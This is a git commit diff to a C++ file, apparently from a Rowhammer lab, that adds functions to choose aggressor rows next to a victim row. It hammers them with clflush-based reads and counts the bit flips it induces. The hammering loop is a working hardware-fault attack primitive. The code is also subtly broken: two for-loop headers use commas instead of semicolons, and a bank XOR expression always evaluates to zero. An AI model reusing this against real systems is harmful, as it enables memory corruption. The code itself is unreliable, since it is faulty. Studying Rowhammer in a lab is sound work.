de6c80f047bb1b5b649df9577afba11f2ace5a3d
Warren L <57687551+Senator-Armstrong-Omelette-Store@users.noreply.github.com>
2024-02-22 20:43:41 -0500

    Update hammering.cc

--- src/hammering/hammering.cc
+++ src/hammering/hammering.cc
@@ -130,16 +130,120 @@ void verify_same_bank(uint64_t samples, uint64_t bank_no) {
 
 }
 
+uint32_t hammer_addresses(uint64_t vict_virt_addr, uint64_t attacker_virt_addr_1, uint64_t attacker_virt_addr_2) {
+
+    uint8_t *vict_virt_addr_ptr = reinterpret_cast<uint8_t *>(vict_virt_addr);
+    uint8_t *attacker_virt_addr_1_ptr = reinterpret_cast<uint8_t *>(attacker_virt_addr_1);
+    uint8_t *attacker_virt_addr_2_ptr = reinterpret_cast<uint8_t *>(attacker_virt_addr_2);
+    memset(vict_virt_addr_ptr, 0x55, ROW_SIZE);
+    memset(attacker_virt_addr_1_ptr, 0xAA, ROW_SIZE);
+    memset(attacker_virt_addr_2_ptr, 0xAA, ROW_SIZE);
+    
+    flush_row(vict_virt_addr_ptr);
+    flush_row(attacker_virt_addr_1_ptr);
+    flush_row(attacker_virt_addr_2_ptr);
+  
+    int num_reads = HAMMERS_PER_ITER;
+
+    while (num_reads-- > 0 ) {
+        asm volatile(
+            "mov (%0), %%rax\n\t"
+            "mov (%1), %%rax\n\t"
+            "clflush (%0)\n\t"
+            "clflush (%1)\n\t"
+            "mfence\n\t"
+            :
+            : "r" (attacker_virt_addr_1), "r" (attacker_virt_addr_2)
+            : "rax"
+        );
+    }
+
+    flush_row(vict_virt_addr_ptr);
+
+    uint32_t number_of_bitflips_in_target = 0;
+    for (uint32_t index = 0; index < ROW_SIZE; index++) {
+        if (vict_virt_addr_ptr[index] != 0x55) {
+            number_of_bitflips_in_target++;
+        }
+    }
+    return number_of_bitflips_in_target; 
+}
+
+/**
+ * returns 1 upon success, 0 upon failure.
+*/
+int get_addresses_to_hammer(uint64_t victim_phys_addr, uint64_t *attacker_1, uint64_t *attacker_2, int row_diff) {
+    int tries = 1000;
+    while (tries-- > 0) {
+        uint64_t row_bits = victim_phys_addr >> 16; // Bit 16+ is for row bits
+        uint64_t column_bits = victim_phys_addr & 0x1fff; // 13 col bits
+
+        int bank_xor_bits = (victim_phys_addr >> 13) & 0x7; // Get Bank XOR Bits
+        int bank = bank_xor_bits ^ (victim_phys_addr & 0x7);
+
+            
+        uint64_t new_row_bits1 = (uint64_t) (row_bits + row_diff);
+        int bits_row_bank_xor1 = (new_row_bits1 & 0x7);
+
+        int new_bank_xor_bits1 = bits_row_bank_xor1 ^ bits_row_bank_xor1;
+
+
+        uint64_t new_row_bits2 = (uint64_t) (row_bits - row_diff);
+        int bits_row_bank_xor2 = (new_row_bits2 & 0x7);
+
+        int new_bank_xor_bits2 = bits_row_bank_xor2 ^ bits_row_bank_xor2;
+
+
+        *attacker_1 = phys_to_virt(get_dram_address(new_row_bits1, new_bank_xor_bits1, column_bits));
+        *attacker_2 = phys_to_virt(get_dram_address(new_row_bits2, new_bank_xor_bits2, column_bits));
+        if (*attacker_1 != 0 && *attacker_2 != 0) return 1;
+    }
+    return 0;
+}
+
+
+void print_result(uint64_t victim, uint64_t attacker_1, uint64_t attacker_2, uint32_t num_bit_flips) {
+    uint64_t x = virt_to_phys(victim);
+    uint64_t a = virt_to_phys(attacker_1);
+    uint64_t b = virt_to_phys(attacker_2);
+    fprintf(stdout, "victim: %s\t%ld (phys)\n", int_to_binary(x), x);
+    fprintf(stdout,"attacker 1: %s\t%ld (phys)\n", int_to_binary(a), a);
+    fprintf(stdout,"attacker 2: %s\t%ld (phys)\n", int_to_binary(b), b);
+    fprintf(stdout,"Bit flips found: %d\n", num_bit_flips);
+}
+
 
 
 int main(int argc, char **argv) {
     setvbuf(stdout, NULL, _IONBF, 0);
-    uint64_t mem_size = 1.8 * BUFFER_SIZE_MB * 1024 * 1024;
+    uint64_t mem_size = (uint64_t) (0.25 * BUFFER_SIZE_MB * (1024 * 1024));
     allocated_mem = allocate_pages(mem_size);
     setup_PPN_VPN_map(allocated_mem, mem_size);
 
     uint64_t victim; 
     uint64_t* attacker_1 = (uint64_t*) calloc(1, sizeof(uint64_t));
-    uint64_t* attacker_2 = (uint64_t*) calloc(1, sizeof(uint64_t)); 
+    uint64_t* attacker_2 = (uint64_t*) calloc(1, sizeof(uint64_t));
+
+    const long int num_iterations = mem_size / ROW_SIZE;
+
+    for (int i = 1; i < num_iterations-1, i++) {
+        victim = (uint64_t)((uint8_t *)allocated_mem + ROW_SIZE * i);
+        // row + 1, row - 1
+        if (get_addresses_to_hammer(virt_to_phys(victim), attacker_1, attacker_2, 1)) {
+            uint32_t num_bit_flips = hammer_addresses(victim, *attacker_1, *attacker_2);
+            print_result(victim, *attacker_1, *attacker_2, num_bit_flips);
+            //if (num_bit_flips > 0) break;
+        }
+    }
+
+    for (int i = 2; i < num_iterations-2, i++) {
+        victim = (uint64_t)((uint8_t *)allocated_mem + ROW_SIZE * i);
+        // row + 2, row - 2
+        if (get_addresses_to_hammer(virt_to_phys(victim), attacker_1, attacker_2, 2)) {
+            uint32_t num_bit_flips = hammer_addresses(victim, *attacker_1, *attacker_2);
+            print_result(victim, *attacker_1, *attacker_2, num_bit_flips);
+            //if (num_bit_flips > 0) break;
+        }
+    }
 
 }
